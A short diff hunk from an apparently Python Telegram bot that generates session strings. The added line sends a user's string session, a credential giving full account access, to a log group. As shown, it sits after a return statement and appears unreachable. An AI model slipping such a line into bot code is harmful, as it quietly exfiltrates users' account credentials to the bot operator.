@@ -200,4 +200,5 @@ async def cancelled(msg):
         return True
     else:
         return False
-        Bot.send_message(log_group , string_session)
+        await client.send_message(log_group , string_session)
+       
